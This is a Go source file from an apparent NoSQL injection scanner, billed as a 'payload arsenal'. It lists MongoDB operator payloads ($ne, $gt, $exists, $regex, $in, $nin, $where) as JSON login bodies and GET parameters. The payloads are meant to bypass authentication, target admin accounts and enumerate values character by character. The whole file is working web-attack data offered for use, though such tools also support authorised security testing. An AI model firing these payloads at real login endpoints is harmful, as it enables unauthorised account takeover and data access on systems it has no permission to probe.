package nosqliengine

// ============================================================
//  NoSQLi PAYLOAD ARSENAL
//  $ne · $gt · $exists · $regex · $where · $in · $lookup · $expr
// ============================================================

// JSONPayload holds a JSON injection payload with description.
type JSONPayload struct {
	Body string
	Desc string
}

// GetJSONPayloads returns all JSON body injection payloads.
func GetJSONPayloads() []JSONPayload {
	return []JSONPayload{
		{
			`{"username": {"$gt": ""}, "password": {"$gt": ""}}`,
			"$gt (greater-than) matches all records",
		},
		{
			`{"username": {"$ne": null}, "password": {"$ne": null}}`,
			"$ne null matches all non-null records",
		},
		{
			`{"username": {"$exists": true}, "password": {"$exists": true}}`,
			"$exists field existence bypass",
		},
		{
			`{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}`,
			"$regex wildcard matches all users",
		},
		// New payloads
		{
			`{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}}`,
			"$in operator — target specific usernames",
		},
		{
			`{"username": {"$nin": [""]}, "password": {"$nin": [""]}}`,
			"$nin (not-in) — exclude empty values, match all others",
		},
		{
			`{"username": {"$ne": ""}, "password": {"$regex": "^.*$"}}`,
			"$ne + $regex combined auth bypass",
		},
		{
			`{"username": "admin", "password": {"$gt": ""}}`,
			"Target admin with $gt password bypass",
		},
		{
			`{"$where": "this.username == 'admin'"}`,
			"$where JavaScript expression — target admin",
		},
		{
			`{"username": {"$regex": "^a"}, "password": {"$ne": ""}}`,
			"$regex prefix extraction — enumerate starting character",
		},
	}
}

// GetGETOperatorPayloads returns operator payloads for GET parameter injection.
func GetGETOperatorPayloads(param string) []struct {
	Query string
	Desc  string
} {
	return []struct {
		Query string
		Desc  string
	}{
		{param + "[$ne]=dorm_random_value_9999", "$ne not-equal bypass"},
		{param + "[$gt]=", "$gt greater-than bypass"},
		{param + "[$exists]=true", "$exists field check bypass"},
		{param + "[$regex]=.*", "$regex wildcard bypass"},
		{param + "[$in][]=admin&" + param + "[$in][]=root", "$in operator — target specific values"},
		{param + "[$nin][]=invalid", "$nin operator — exclude invalid"},
	}
}
